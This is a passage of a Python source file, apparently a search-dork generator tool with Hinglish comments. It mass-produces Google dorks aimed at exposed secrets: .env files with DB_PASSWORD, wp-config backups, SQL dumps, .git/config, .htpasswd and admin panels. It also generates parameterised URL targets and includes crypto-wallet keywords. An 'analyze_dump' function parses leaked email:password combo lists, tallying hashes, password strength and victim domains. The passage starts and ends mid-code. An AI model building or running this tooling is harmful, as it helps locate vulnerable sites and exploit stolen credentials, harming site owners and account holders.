    "gr", "tr", "pk", "bd", "lk", "np", "id", "my", "ph", "th", "vn", "sg", "hk",
    "kr", "jp", "cn", "tw", "au", "nz", "ca", "us", "za", "ng", "ke", "eg",
    "sa", "ae", "il", "ir", "ua", "cz", "ro", "hu", "bg", "hr", "sk", "lt", "lv",
    "ee", "si", "shop", "store", "site", "online", "xyz", "top", "club", "live",
]

NICHES = {
    "ecommerce": ["shop", "store", "cart", "checkout", "product", "price", "buy", "order"],
    "accounts": ["login", "signin", "signup", "register", "account", "profile", "password"],
    "admin": ["admin", "panel", "dashboard", "cpanel", "manage", "control", "console"],
    "files": ["download", "upload", "file", "document", "backup", "export", "dump"],
    "news": ["news", "article", "blog", "post", "story", "press", "report"],
    "crypto": ["wallet", "ledger", "seed", "private", "keystore", "metamask"],
    "api": ["api", "endpoint", "swagger", "graphql", "rest", "token", "key"],
    "db": ["database", "sql", "mysql", "phpmyadmin", "dump", "backup", "schema"],
}

KW_PRE = ["best", "cheap", "top", "new", "pro", "free", "premium", "buy", "get",
          "download", "online", "fast", "safe", "trusted", "verified", "instant",
          "unlimited", "private", "secure", "real", "legit", "working", "fresh",
          "latest", "official", "custom", "advanced", "simple", "easy", "full"]

KW_SUF = ["online", "shop", "store", "site", "hub", "zone", "world", "point",
          "plus", "pro", "max", "lab", "works", "base", "central", "market",
          "planet", "express", "direct", "deal", "deals", "offer", "offers",
          "sale", "review", "reviews", "guide", "tips", "list", "lists",
          "finder", "portal", "cloud", "app"]

KW_INTENT = ["price", "cost", "buy", "download", "free", "app", "apk", "login",
             "signup", "account", "service", "provider", "company", "near me",
             "review", "alternative", "how to", "guide", "tutorial", "tool",
             "software", "script", "api", "documentation", "template", "demo",
             "trial", "pricing"]

KW_TAIL = ["for beginners", "for business", "for sale", "for free", "near me",
           "in india", "in usa", "in uk", "online free", "free download",
           "full version", "latest version", "source code", "with source code",
           "script download", "template free", "wordpress plugin", "laravel",
           "django", "node js", "react", "python script", "php script",
           "api docs", "pdf download", "excel sheet", "csv file", "json api",
           "sql database", "admin panel", "login page", "dashboard",
           "control panel", "user manual", "setup guide", "configuration",
           "backup", "database dump", "export csv", "import data", "reports",
           "analytics", "invoice", "payment gateway", "checkout page",
           "shopping cart", "order tracking", "inventory system", "crm",
           "erp", "saas", "demo download", "pricing plans", "features list",
           "comparison", "alternatives list", "top 10", "directory list",
           "user complaints", "scam or legit", "trusted site", "best deal",
           "discount code", "coupon code", "free trial", "software download",
           "apk download", "mobile app", "desktop app", "web app",
           "chrome extension", "api key", "developer docs", "support page",
           "help center", "knowledge base"]

KW_YEARS = ["2026", "2027"]

# v2.9 — capacity badhane wale naye layers
KW_VERBS = ["buy", "download", "get", "order", "book", "hire", "find", "compare",
            "search", "check", "open", "use", "make", "build", "create", "start"]
KW_QUAL = ["best", "top", "cheap", "free", "premium", "fast", "safe", "trusted",
           "verified", "official", "real", "new", "latest", "popular", "reliable",
           "instant", "secure", "private", "unlimited", "advanced"]
KW_NOUNS = ["service", "provider", "company", "agency", "platform", "tool",
            "software", "app", "website", "portal", "store", "shop", "market",
            "directory", "listing", "database", "panel", "dashboard", "api", "script"]
KW_GEO = ["in india", "in usa", "in uk", "in bd", "in pk", "in id", "in br",
          "in ng", "in ru", "in de", "in fr", "in ae", "in sa", "in tr"]
KW_GEO2 = ["india", "usa", "uk", "bangladesh", "pakistan", "indonesia", "brazil",
           "nigeria", "russia", "germany", "france", "uae", "saudi", "turkey"]
KW_SUFFIX2 = ["hub", "world", "zone", "point", "base", "central", "market",
              "planet", "express", "direct", "lab", "works", "plus", "pro", "max"]
KW_TAIL2 = ["with source code", "free trial", "no credit card", "instant access",
            "24 7 support", "near me", "for beginners", "for business",
            "step by step", "best price", "full list", "updated 2026"]

KW_MAX = 1000000          # 10 lakh per run — admin 10M tak badha sakta hai
KW_HARD_MAX = 10000000    # 1 crore absolute cap
DORK_MAX = 100000

KW_BAD = {"", "a", "an", "the", "of", "in", "on", "at", "to", "for", "and", "or",
          "is", "are", "was", "be", "it", "this", "that", "with", "from", "by"}

DORK_TEMPLATES = [
    'inurl:{f} {p}= ext:{e}',
    'inurl:"{p}="',
    'inurl:{f}?{p}=',
    'allinurl:"{f}?{p}="',
    'inurl:{d}{f}?{p}=',
    '"{f}?{p}=" -site:github.com',
    'intext:"{p}=" inurl:{e}',
    'intitle:"{k}" inurl:{e}',
    'site:{t} inurl:{f}',
    'filetype:{e} inurl:{k}',
    'inurl:{f} intext:{k}',
    '"{f}" "{p}=" {t}',
]

_SRC = ""


def _uniq(seq):
    seen, out = set(), []
    for x in seq:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


PARAM_SHAPES = ["", "?id=", "?pid=", "?page=", "?cat=", "?item=", "?p=", "?view=",
                 "?catid=", "?product_id=", "?user=", "?file="]


def gen_page_types() -> list:
    """dir × file × query-shape — real count (45k+)."""
    out = []
    for d in PAGE_DIRS:
        for f in PAGE_FILES:
            for q in PARAM_SHAPES:
                out.append(d + f + q)
    return out


def gen_extensions() -> list:
    return list(EXTENSIONS)


def gen_params() -> list:
    """Base params + real-world variants (sirf sensible ones)."""
    out = []
    for p in PARAMS_BASE:
        p = str(p).strip()
        if not p or p.endswith("_id") or p.endswith("id"):
            out.append(p)
            out.append(p + "[]")
            continue
        out.append(p)
        out.append(p + "_id")
        out.append(p + "id")
        out.append(p + "[]")
    # junk shapes hatao: x_id_id=, xxidid=, x__id=
    bad = re.compile(r"(_id_id|idid|__|\[\]\[\])$", re.I)
    return _uniq([x for x in out if x and not bad.search(x)])


def db_counts() -> dict:
    pts = gen_page_types()
    prs = gen_params()
    exts = gen_extensions()
    # dork space = templates × (page-types × params) capped realistically
    combo = len(pts) * len(prs)
    dork_space = len(DORK_TEMPLATES) * len(prs) * len(exts)
    return {
        "page_types": len(pts),
        "keywords": len(KW_PRE) * len(KW_SUF) * len(KW_INTENT),
        "extensions": len(exts),
        "parameters": len(prs),
        "dorks": combo + dork_space,
        "tlds": len(TLDS),
    }


# ═══════════════════════════════════════════════════════════════════════════════
#  DORK ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
QUALITY_BAD = {
    "allinurl:", "allintitle:", "allintext:", "inanchor:", "cache:", "link:",
    "info:", "related:", "define:", "stocks:", "movie:",
}
BROAD_WORDS = {"www", "com", "net", "org", "index", "home", "main", "page", "html"}


def score_dork(dork: str) -> tuple:
    """0-100 quality score + reasons. Real logic, koi random nahi."""
    d = (dork or "").strip()
    if not d:
        return 0, ["khaali"]
    reasons, score = [], 50

    ops = []
    for op in ("site:", "inurl:", "intitle:", "intext:", "filetype:", "ext:"):
        if op in d.lower():
            ops.append(op.rstrip(":"))
    if ops:
        score += min(30, 10 * len(ops))
        reasons.append("+%d operator (%s)" % (min(30, 10 * len(ops)), ",".join(ops)))
    else:
        score -= 15
        reasons.append("-15 no operator")

    n = len(d)
    if 20 <= n <= 100:
        score += 8
        reasons.append("+8 good length (%d)" % n)
    elif n > 160:
        score -= 20
        reasons.append("-20 too long (%d)" % n)
    elif n < 12:
        score -= 12
        reasons.append("-12 too short")

    if re.search(r'\binurl:[a-z_]+\=', d, re.I):
        score += 8
        reasons.append("+8 inurl with a parameter")
    if re.search(r'filetype:\(?\w+', d, re.I) or re.search(r'ext:\w+', d, re.I):
        score += 5
        reasons.append("+5 filetype")
    if d.count('"') % 2:
        score -= 12
        reasons.append("-12 quote not closed")
    if re.search(r'\b(site|inurl|intitle|intext)\s*:\s*(\s|$)', d, re.I):
        score -= 15
        reasons.append("-15 operator khaali")
    low = d.lower()
    for b in QUALITY_BAD:
        if b in low:
            score -= 10
            reasons.append("-10 deprecated operator %s" % b)
    words = re.findall(r"[a-z0-9]+", low)
    if words and all(w in BROAD_WORDS for w in words):
        score -= 20
        reasons.append("-20 only broad words")
    if len(set(words)) < max(1, len(words) // 3):
        score -= 8
        reasons.append("-8 too repetitive")
    if re.search(r'[^\x00-\x7f]', d):
        score -= 6
        reasons.append("-6 non-ascii")

    return max(0, min(100, score)), reasons


def quality_label(score: int) -> str:
    if score >= 80:
        return "🔥 EXCELLENT"
    if score >= 65:
        return "✅ GOOD"
    if score >= 45:
        return "🟡 AVERAGE"
    if score >= 25:
        return "🟠 WEAK"
    return "🔴 TRASH"


_GRADE_STEPS = ((95, "S+"), (88, "S"), (78, "A"), (68, "B"), (55, "C"), (40, "D"))
GRADE_EMOJI = {"S+": "💎", "S": "🏆", "A": "🟢", "B": "🔵", "C": "🟡", "D": "🟠", "F": "🔴"}


def dork_grade(score) -> str:
    """0-100 → S+ / S / A / B / C / D / F."""
    try:
        sc = float(score)
    except Exception:
        return "F"
    for cut, g in _GRADE_STEPS:
        if sc >= cut:
            return g
    return "F"


_INTENT_WORDS = ("login", "admin", "panel", "dashboard", "signin", "register", "upload",
                 "backup", "config", "env", "database", "phpmyadmin", "wp-admin", "api",
                 "invoice", "order", "payment", "cpanel", "webmail", "portal")
_JUNK_WORDS = ("free download", "crack", "serial key", "torrent", "mp3", "song",
               "movie", "xxx", "porn", "game hack")


def score_dims(dork: str) -> dict:
    """9 dimension breakdown — har dimension ke points (total 100)."""
    d = " ".join(str(dork or "").lower().split())
    dims = {"operators": 0, "site": 0, "path": 0, "filetype": 0, "quotes": 0,
            "intent": 0, "length": 0, "clean": 0, "specific": 0}
    if not d:
        return dims
    ops = [o for o in ("site:", "inurl:", "intitle:", "intext:", "filetype:", "ext:")
           if o in d]
    dims["operators"] = 30 if len(ops) >= 3 else (22 if len(ops) == 2 else
                                                  (14 if len(ops) == 1 else 0))
    if "site:" in d:
        tail = d.split("site:", 1)[1].split()[0] if len(d.split("site:", 1)) > 1 else ""
        dims["site"] = 14 if ("." in tail and len(tail) > 3) else 6
    if "inurl:" in d:
        tail = d.split("inurl:", 1)[1].split()[0] if len(d.split("inurl:", 1)) > 1 else ""
        dims["path"] = 12 if any(c in tail for c in "=/.") else 7
    if "filetype:" in d or "ext:" in d:
        dims["filetype"] = 10
    if '"' in d:
        dims["quotes"] = 8
    dims["intent"] = 10 if any(w in d for w in _INTENT_WORDS) else 2
    n = len(d)
    dims["length"] = 6 if 25 <= n <= 120 else (3 if 15 <= n <= 180 else 0)
    dims["clean"] = 0 if any(w in d for w in _JUNK_WORDS) else 6
    if re.search(r"\.(php|asp|aspx|jsp|env|sql|bak|json|xml)", d) or re.search(r"[?&]\w+=", d):
        dims["specific"] = 4
    return dims


def dork_score_full(dork: str) -> dict:
    """Total + grade + 9 dims (UI card ke liye)."""
    dims = score_dims(dork)
    total = max(0, min(100, sum(dims.values())))
    return {"total": total, "grade": dork_grade(total), "dims": dims}


HASH_RULES = (
    (r"^\$2[abxy]\$\d\d\$", "bcrypt"),
    (r"^\$argon2", "argon2"),
    (r"^\$1\$", "md5-crypt"),
    (r"^\$5\$", "sha256-crypt"),
    (r"^\$6\$", "sha512-crypt"),
    (r"^\*[A-Fa-f0-9]{40}$", "mysql5"),
    (r"^\{SSHA\}", "ssha"),
    (r"^[A-Fa-f0-9]{32}$", "md5"),
    (r"^[A-Fa-f0-9]{40}$", "sha1"),
    (r"^[A-Fa-f0-9]{64}$", "sha256"),
    (r"^[A-Fa-f0-9]{96}$", "sha384"),
    (r"^[A-Fa-f0-9]{128}$", "sha512"),
)


def detect_hash(value) -> str:
    """Hash type pehchano — koi cracking nahi, sirf sha-pehchan (identify)."""
    v = str(value or "").strip()
    if len(v) < 16:
        return ""
    for pat, name in HASH_RULES:
        if re.match(pat, v):
            return name
    return ""


def password_strength(pw) -> str:
    """Password ki taakat: weak / medium / strong / very_strong."""
    p = str(pw or "")
    if not p:
        return "weak"
    pts = 0
    pts += 3 if len(p) >= 16 else (2 if len(p) >= 12 else (1 if len(p) >= 8 else 0))
    pts += 1 if re.search(r"[a-z]", p) else 0
    pts += 1 if re.search(r"[A-Z]", p) else 0
    pts += 1 if re.search(r"\d", p) else 0
    pts += 1 if re.search(r"[^A-Za-z0-9]", p) else 0
    if len(set(p)) < max(3, len(p) // 3):
        pts -= 1                       # "111111" / "aaaaaa"
    if pts >= 6:
        return "very_strong"
    if pts >= 4:
        return "strong"
    if pts >= 2:
        return "medium"
    return "weak"


def analyze_dump(items) -> dict:
    """Dump (list ya text) ko todo: combos / emails / hashes / strength / domains."""
    if isinstance(items, str):
        raw = [x.strip() for x in items.splitlines() if x.strip()]
    else:
        raw = [str(x).strip() for x in (items or []) if str(x).strip()]
    data = {"lines": len(raw), "unique": 0, "combo": 0, "emails": 0, "users": 0,
            "hash": {}, "strength": {"weak": 0, "medium": 0, "strong": 0,
                                     "very_strong": 0},
            "domains": {}, "combo_list": [], "hash_list": [], "email_list": []}
    seen = set()
    email_re = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
    for line in raw:
        if line in seen:
            continue
        seen.add(line)
        parts = re.split(r"[:|;\t]", line, maxsplit=2)
        hit = False
        if len(parts) >= 2:
            left, right = parts[0].strip(), parts[1].strip()
            if "@" in left and right:
                data["combo"] += 1
                data["combo_list"].append(line)
                data["email_list"].append(left.lower())
                dom = left.split("@", 1)[1].lower()
                data["domains"][dom] = data["domains"].get(dom, 0) + 1
                data["strength"][password_strength(right)] += 1
                h = detect_hash(right)
                if h:
                    data["hash"][h] = data["hash"].get(h, 0) + 1
                    data["hash_list"].append(line)
                hit = True
            elif detect_hash(right):
                data["hash"][detect_hash(right)] = data["hash"].get(detect_hash(right), 0) + 1
                data["hash_list"].append(line)
                data["users"] += 1
                hit = True
        if not hit:
            if email_re.fullmatch(line):
                data["emails"] += 1
                data["email_list"].append(line.lower())
                dom = line.split("@", 1)[1].lower()
                data["domains"][dom] = data["domains"].get(dom, 0) + 1
            else:
                h = detect_hash(line)
                if h:
                    data["hash"][h] = data["hash"].get(h, 0) + 1
                    data["hash_list"].append(line)
    data["unique"] = len(seen)
    data["combo_list"] = _uniq(data["combo_list"])
    data["hash_list"] = _uniq(data["hash_list"])
    data["email_list"] = _uniq(data["email_list"])
    data["top_domains"] = sorted(data["domains"].items(), key=lambda z: -z[1])[:5]
    data["domain_count"] = len(data["domains"])
    return data


def _natural_key(x: str):
    return [int(t) if t.isdigit() else t.lower()
            for t in re.split(r"(\d+)", str(x or ""))]


def merge_dedup(items, sort_mode: str = "smart") -> dict:
    """Multiple lists → ek merged + deduped + sorted list (generic, koi card-data nahi)."""
    flat = []
    for it in (items or []):
        if isinstance(it, (list, tuple, set)):
            flat.extend(str(x).strip() for x in it)
        else:
            flat.extend(str(x).strip() for x in str(it).splitlines())
    flat = [x for x in flat if x]
    uniq = _uniq(flat)
    if sort_mode == "alpha":
        uniq = sorted(uniq, key=lambda z: z.lower())
    elif sort_mode == "length":
        uniq = sorted(uniq, key=len)
    else:                                   # smart — natural sort (page2 < page10)
        uniq = sorted(uniq, key=_natural_key)
    kinds = {"url": 0, "dork": 0, "email": 0, "number": 0, "other": 0}
    for u in uniq:
        low = u.lower()
        if low.startswith("http"):
            kinds["url"] += 1
        elif "@" in u and " " not in u:
            kinds["email"] += 1
        elif re.fullmatch(r"\d{5,}", u):
            kinds["number"] += 1
        elif re.search(r"(site:|inurl:|intitle:|intext:|filetype:|ext:)", low) or " " in u:
            kinds["dork"] += 1
        else:
            kinds["other"] += 1
    return {"list": uniq, "input": len(flat), "unique": len(uniq),
            "dupes": len(flat) - len(uniq), "kinds": kinds, "sort": sort_mode}


# ── CMS + exposed-file dork engine ─────────────────────────────────────────
CMS_DORKS = {
    "wordpress": ['inurl:wp-content/plugins (KW)', 'inurl:wp-admin (KW)',
                  'inurl:wp-config (KW)', 'intext:"wp-config.php" (KW)',
                  'inurl:/wp-content/uploads/ (KW) filetype:sql',
                  'inurl:wp-json/wp/v2/users (KW)', 'inurl:readme.html (KW)'],
    "joomla": ['inurl:components/com_ (KW)', 'inurl:administrator (KW)',
               'inurl:configuration.php (KW)', 'intext:"Joomla!" (KW) inurl:index.php'],
    "opencart": ['inurl:index.php?route=product (KW)', 'inurl:admin (KW) OpenCart',
                 'intext:"OpenCart" (KW) inurl:index.php'],
    "prestashop": ['inurl:/modules/ (KW)', 'intext:"PrestaShop" (KW)',
                   'inurl:admin (KW) PrestaShop'],
    "magento": ['inurl:/skin/frontend/ (KW)', 'inurl:downloader (KW)',
                'intext:"Magento" (KW) inurl:admin'],
    "drupal": ['inurl:sites/default/files (KW)', 'inurl:user/login (KW) drupal',
               'intext:"Drupal" (KW) inurl:node'],
    "laravel": ['intext:"Whoops!" (KW)', 'inurl:/storage/logs/ (KW)',
                'intext:"laravel" (KW) inurl:.env'],
    "codeigniter": ['intext:"CodeIgniter" (KW)', 'inurl:index.php/ (KW)',
                    'intext:"The page you are looking for" (KW)'],
}

EXPOSED_DORKS = [
    "inurl:.env (KW)", "filetype:env (KW) DB_PASSWORD", "filetype:sql (KW) intext:INSERT",
    "inurl:wp-config.php.bak (KW)", "filetype:bak (KW)", "inurl:backup.sql (KW)",
    "inurl:phpmyadmin (KW)", "inurl:.git/config (KW)", "inurl:config.php.bak (KW)",
    "inurl:db.sql (KW)", "inurl:.DS_Store (KW)", "filetype:log (KW) password",
    "inurl:adminer.php (KW)", "inurl:server-status (KW)", "inurl:.htpasswd (KW)",
]


DORK_MODS = ["", " filetype:php", " inurl:index.php", " intext:admin",
             " inurl:login", " inurl:upload", " inurl:api"]


def cms_dorks(cms: str, keywords="", n: int = 200) -> list:
    """Ek CMS ke liye dorks — keyword + modifiers se variety."""
    cms = (cms or "").lower()
    cands = CMS_DORKS.get(cms)
    if not cands:
        cands = [t for lst in CMS_DORKS.values() for t in lst]
    kws = kw_cores(keywords) if str(keywords or "").strip() else [""]
    out = []
    combos = len(cands) * max(1, len(kws))
    for i in range(max(1, int(n or 200)) * 4):
        tpl = cands[i % len(cands)]
        kw = kws[(i // len(cands)) % max(1, len(kws))]
        mod = DORK_MODS[(i // combos) % len(DORK_MODS)]
        line = " ".join((tpl.replace("(KW)", kw) + mod).split())
        if line and line not in out:
            out.append(line)
        if len(out) >= n:
            break
    return _dork_finish(out, int(n or 200))


def exposed_dorks(keywords="", n: int = 200) -> list:
    kws = kw_cores(keywords) if str(keywords or "").strip() else [""]
    out = []
    combos = len(EXPOSED_DORKS) * max(1, len(kws))
    for i in range(max(1, int(n or 200)) * 4):
        tpl = EXPOSED_DORKS[i % len(EXPOSED_DORKS)]
        kw = kws[(i // len(EXPOSED_DORKS)) % max(1, len(kws))]
        mod = DORK_MODS[(i // combos) % len(DORK_MODS)]
        line = " ".join((tpl.replace("(KW)", kw) + mod).split()).strip()
        if line and line not in out:
            out.append(line)
        if len(out) >= n:
            break
    return _dork_finish(out, int(n or 200))


_PAGE_TYPES_CACHE = None
NICHE_WORDS = ["admin", "login", "dashboard", "panel", "backup", "config", "upload",
               "download", "invoice", "order", "product", "category", "search",
               "profile", "account", "settings", "api", "database", "report",
               "payment", "checkout", "cart", "user", "admin.php", "index.php"]


def _all_niche_words() -> list:
    out = []
    for vs in NICHES.values():
        out.extend(vs)
    return _uniq(out) or list(NICHE_WORDS)


def make_dork(mode: str = "mixed", n: int = 50, niche: str = "", tld: str = "",
              domain: str = "", exclude=None, fresh: bool = False) -> list:
    """Dork generator v2 — 100000 tak, fresh mode (purane dorks skip).

    mode: page | ext | param | inurl | site | niche | mixed
    """
    n = max(1, min(DORK_MAX, int(n or 50)))
    prs = gen_params()
    exts = list(EXTENSIONS)
    words = NICHE_WORDS
    ex = set(exclude or ())
    if fresh:
        ex |= dork_seen()
    out, seen = [], set(ex)

    def add(x):
        x = " ".join(str(x).split())
        if not x or len(x) > 200 or x in seen:
            return False
        if ex and dork_hash(x) in ex:
            return False
        seen.add(x)
        out.append(x)
        return True

    def full():
        return len(out) >= n

    mode = (mode or "mixed").lower()
    doms = [d.strip().lstrip(".").lower()
            for d in re.split(r"[,\s]+", str(domain or "")) if d.strip()]
    if tld and not doms:
        doms = [tld.strip().lstrip(".").lower()]

    # ── PAGE-TYPES ────────────────────────────────────────────────────────────
    if mode == "page":
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                add("inurl:%s%s" % (d, f))
                if full():
                    return _dork_finish(out, n)
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                add('inurl:"%s%s"' % (d, f))
                add("allinurl:%s%s" % (d, f))
                if full():
                    return _dork_finish(out, n)
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                for p in prs[:40]:
                    add("inurl:%s%s?%s=" % (d, f, p))
                    if full():
                        return _dork_finish(out, n)

    # ── EXTENSIONS ────────────────────────────────────────────────────────────
    elif mode == "ext":
        for e in exts:
            add("filetype:%s" % e)
            add("ext:%s" % e)
        for e in exts:
            for p in prs:
                add("filetype:%s inurl:%s=" % (e, p))
                if full():
                    return _dork_finish(out, n)
        for e in exts:
            for f in PAGE_FILES:
                for d in PAGE_DIRS[:24]:
                    add("filetype:%s inurl:%s%s" % (e, d, f))
                    if full():
                        return _dork_finish(out, n)

    # ── PARAMETERS ────────────────────────────────────────────────────────────
    elif mode == "param":
        for p in prs:
            add("inurl:%s=" % p)
            add('inurl:"%s="' % p)
        for p in prs:
            for f in PAGE_FILES:
                add("inurl:%s?%s=" % (f, p))
                if full():
                    return _dork_finish(out, n)
        for p in prs:
            for d in PAGE_DIRS[:30]:
                for f in PAGE_FILES[:20]:
                    add("inurl:%s%s?%s=" % (d, f, p))
                    if full():
                        return _dork_finish(out, n)

    # ── INURL (naya) ──────────────────────────────────────────────────────────
    elif mode == "inurl":
        for f in PAGE_FILES:
            add("inurl:%s" % f)
            add('inurl:"%s"' % f)
            add("allinurl:%s" % f)
        for d in PAGE_DIRS:
            if not d:
                continue
            add("inurl:%s" % d.rstrip("/"))
            for f in PAGE_FILES[:60]:
                add("inurl:%s%s" % (d, f))
                if full():
                    return _dork_finish(out, n)
        for f in PAGE_FILES:
            for p in prs:
                add("inurl:%s?%s=" % (f, p))
                if full():
                    return _dork_finish(out, n)
        for d in PAGE_DIRS:
            for f in PAGE_FILES:
                for p in prs[:30]:
                    add("inurl:%s%s?%s=" % (d, f, p))
                    if full():
                        return _dork_finish(out, n)

    # ── SITE (naya) ───────────────────────────────────────────────────────────
    elif mode == "site":
        if not doms:
            doms = random.sample(TLDS, min(6, len(TLDS)))
        for dom in doms:
            for f in PAGE_FILES:
                add("site:%s inurl:%s" % (dom, f))
            for p in prs[:150]:
                add("site:%s inurl:%s=" % (dom, p))
            for e in exts:
                add("site:%s ext:%s" % (dom, e))
                add("site:%s filetype:%s" % (dom, e))
            for w in words:
                add("site:%s intitle:%s" % (dom, w))
                add("site:%s intext:%s" % (dom, w))
                if full():
                    return _dork_finish(out, n)
            for f in PAGE_FILES[:60]:
                for p in prs[:60]:
                    add("site:%s inurl:%s?%s=" % (dom, f, p))
                    if full():
                        return _dork_finish(out, n)
            for w in words:
                for p in prs[:60]:
                    add("site:%s intext:%s inurl:%s=" % (dom, w, p))
                    if full():
                        return _dork_finish(out, n)
            for d in PAGE_DIRS[:30]:
                for f in PAGE_FILES[:30]:
                    add("site:%s inurl:%s%s" % (dom, d, f))
                    if full():
                        return _dork_finish(out, n)
            if full():
                return _dork_finish(out, n)

    # ── NICHE ─────────────────────────────────────────────────────────────────
    elif mode == "niche":
        kws = NICHES.get(niche) or _all_niche_words()
        for k in kws:
            add("inurl:%s" % k)
            add("intitle:%s" % k)
            add("allintitle:%s" % k)
        for k in kws:
            for p in prs:
                add("intext:%s inurl:%s=" % (k, p))
                if full():
                    return _dork_finish(out, n)
        for k in kws:
            for f in PAGE_FILES:
                for d in PAGE_DIRS[:16]:
                    add("inurl:%s%s intext:%s" % (d, f, k))
                    if full():
                        return _dork_finish(out, n)

    # ── MIXED / HQ ────────────────────────────────────────────────────────────
    else:
        tpls = DORK_TEMPLATES
        i, stall = 0, 0
        while not full() and stall < n * 4 + 5000:
            before = len(out)
            f = PAGE_FILES[i % len(PAGE_FILES)]
            d = PAGE_DIRS[(i // 5) % len(PAGE_DIRS)]
            p = prs[(i // 7) % len(prs)]
            e = exts[(i // 11) % len(exts)]
            k = words[(i // 13) % len(words)]
            t = TLDS[(i // 17) % len(TLDS)]
            tpl = tpls[i % len(tpls)]
            try:
                s2 = tpl.format(f=f, p=p, d=d, e=e, k=k, t=t)
            except Exception:
                s2 = "inurl:%s?%s=" % (f, p)
            add(s2)
            if len(out) == before:
                stall += 1
            else:
                stall = 0
            i += 1

    if tld and mode not in ("site", "mixed"):
        base = list(out)
        for x in base[: max(0, n // 3)]:
            add("site:.%s %s" % (tld.strip().lstrip("."), x))
            if full():
                break
    return _dork_finish(out, n)


def _dork_finish(pool: list, n: int) -> list:
    """Quality sort + top n."""
    pool = _uniq(pool)
    if len(pool) > n:
        scored = sorted(((score_dork(x)[0], x) for x in pool), key=lambda z: -z[0])
        pool = [x for _, x in scored[:n]]
    else:
        pool = sorted(pool, key=lambda x: -score_dork(x)[0])
    return pool


def dork_gen(mode: str = "mixed", n: int = 50, niche: str = "", tld: str = "",
             domain: str = "", fresh: bool = False, mark: bool = True) -> dict:
    """Dork banao + fresh history handle karo. Returns dict."""
    dorks = make_dork(mode, n=n, niche=niche, tld=tld, domain=domain, fresh=fresh)
    new_cnt = dork_seen_add(dorks) if (mark and dorks) else 0
    return {"dorks": dorks, "new": new_cnt, "seen": dork_seen_count(),
            "asked": n, "mode": mode, "fresh": fresh}


def kw_clean(x) -> str:
    """Keyword/seed ko saaf karo — lowercase, extra spaces hatao."""
    x = " ".join(str(x or "").lower().split())
    x = re.sub(r"[^a-z0-9 \-']", " ", x)
    words = [w for w in x.split() if w not in KW_BAD]
    return " ".join(words[:6])[:70]


URL_OP_RE = re.compile(r"(?:inurl|allinurl|inanchor)\s*:\s*\"?$")
_NON_SLUG = re.compile(r"[^a-z0-9]+")


def kw_slug(kw) -> str:
    """Keyword ka URL form — space ki jagah '-'.
    Google URL me space nahi hota, isliye inurl: ke liye yehi sahi hai.
    'shopify store' -> 'shopify-store'
    """
    return _NON_SLUG.sub("-", str(kw or "").lower()).strip("-")[:70]


def kw_cores(items, limit: int = 800) -> list:
    """Seeds YA keyword list -> unique cores (max 800)."""
    if isinstance(items, str):
        items = re.split(r"[,\n;|]+", items)
    out = []
    for it in items or []:
        c = kw_clean(it)
        if len(c) < 3:
            continue
        out.append(c)
        if len(out) >= limit * 3:
            break
    return _uniq(out)[:limit]


def kw_capacity(cores) -> int:
    """In cores se max kitne unique keywords ban sakte hain (approx)."""
    per = (1 + len(KW_PRE) + len(KW_SUF) + len(KW_INTENT) + len(KW_TAIL)
           + len(KW_PRE) * len(KW_SUF) + len(KW_PRE) * len(KW_INTENT)
           + len(KW_SUF) * len(KW_INTENT) + len(KW_PRE) * len(KW_TAIL)
           + len(KW_TAIL) * len(KW_INTENT)
           + len(KW_PRE) * len(KW_SUF) * len(KW_INTENT)
           + len(KW_YEARS) * (len(KW_PRE) + len(KW_SUF) + len(KW_INTENT))
           # v2.9 layers
           + len(KW_QUAL) * len(KW_NOUNS)
           + len(KW_VERBS) * len(KW_QUAL)
           + len(KW_VERBS) * len(KW_NOUNS)
           + len(KW_GEO) * len(KW_PRE)
           + len(KW_GEO2) * len(KW_SUFFIX2)
           + len(KW_TAIL2) * len(KW_INTENT)
           + len(KW_YEARS) * len(KW_NOUNS))
    return per * max(1, len(cores))


def kw_recipes() -> list:
    """Recipe list — har recipe (core) → ek keyword. Order = variety (pattern-major)."""
    R = []
    R.append(lambda c: c)
    # ek-shabd layers — PRE → SUF → INTENT → TAIL, ek-ek karke (mix)
    for i in range(max(len(KW_PRE), len(KW_SUF), len(KW_INTENT), len(KW_TAIL))):
        if i < len(KW_PRE):
            R.append(lambda c, i=i: KW_PRE[i] + " " + c)
        if i < len(KW_SUF):
            R.append(lambda c, i=i: c + " " + KW_SUF[i])
        if i < len(KW_INTENT):
            R.append(lambda c, i=i: c + " " + KW_INTENT[i])
        if i < len(KW_TAIL):
            R.append(lambda c, i=i: c + " " + KW_TAIL[i])
    # do-shabd layers — chhote cross products, phir bade
    for i in range(min(len(KW_PRE), 12)):
        for j in range(min(len(KW_SUF), 8)):
            R.append(lambda c, i=i, j=j: "%s %s %s" % (KW_PRE[i], c, KW_SUF[j]))
    for i in range(min(len(KW_PRE), 10)):
        for j in range(min(len(KW_INTENT), 8)):
            R.append(lambda c, i=i, j=j: "%s %s %s" % (KW_PRE[i], c, KW_INTENT[j]))
    for i in range(min(len(KW_SUF), 10)):
        for j in range(min(len(KW_INTENT), 8)):
            R.append(lambda c, i=i, j=j: "%s %s %s" % (c, KW_SUF[i], KW_INTENT[j]))
    for i in range(min(len(KW_TAIL), 10)):
        for j in range(min(len(KW_INTENT), 8)):
            R.append(lambda c, i=i, j=j: "%s %s %s" % (c, KW_TAIL[i], KW_INTENT[j]))
    # v2.9 layers
    for i in range(min(len(KW_QUAL), 10)):
        for j in range(min(len(KW_NOUNS), 6)):
            R.append(lambda c, i=i, j=j: "%s %s %s" % (KW_QUAL[i], c, KW_NOUNS[j]))
    for i in range(min(len(KW_VERBS), 10)):
        R.append(lambda c, i=i: "%s %s" % (KW_VERBS[i], c))
    for i in range(min(len(KW_GEO), 8)):
        R.append(lambda c, i=i: "%s %s" % (c, KW_GEO[i]))
    # teen-shabd layers (bade pool — end me)
    for i in range(min(len(KW_PRE), 8)):
        for j in range(min(len(KW_SUF), 5)):
            for k in range(min(len(KW_INTENT), 4)):
                R.append(lambda c, i=i, j=j, k=k:
                         "%s %s %s %s" % (KW_PRE[i], c, KW_SUF[j], KW_INTENT[k]))
    for y in KW_YEARS[:3]:
        for i in range(min(len(KW_PRE), 6)):
            R.append(lambda c, y=y, i=i: "%s %s %s" % (KW_PRE[i], c, y))
        for i in range(min(len(KW_SUF), 6)):
